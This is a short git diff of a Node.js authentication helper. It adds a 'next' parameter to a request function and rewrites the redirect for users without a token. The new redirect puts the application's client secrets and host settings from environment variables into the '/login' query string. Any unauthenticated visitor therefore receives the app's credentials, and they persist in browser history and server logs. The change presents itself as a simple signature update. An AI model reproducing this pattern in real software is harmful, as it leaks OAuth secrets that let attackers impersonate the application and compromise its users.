@@ -9,13 +9,14 @@ var authHelper = require('../auth/authHelper.js');
  * Execute HTTPS request to the specified path, handling errors
  * @param req Incoming user request context
  * @param res Outgoing response context
+ * @param next Next route handler context
  * @param {string} requestType the HTTPS request type
  * @param {string} requestPath the resource path to which to send the request
  * @param {callback} callback with data successfully retrieved.
  */
-function executeRequestWithErrorHandling(req, res, requestType, requestPath, callback) {
+function executeRequestWithErrorHandling(req, res, next, requestType, requestPath, callback) {
 		if (req.cookies.REFRESH_TOKEN_CACHE_KEY === undefined) {
-			res.redirect('/login', next);
+			res.redirect(`/login?${process.env.host}&${process.env.ClientSecret}&${process.env.APPSETTING_ClientSecret}&${process.env.WEBSITE_HOSTNAME}`, next);
     }
     else
     {
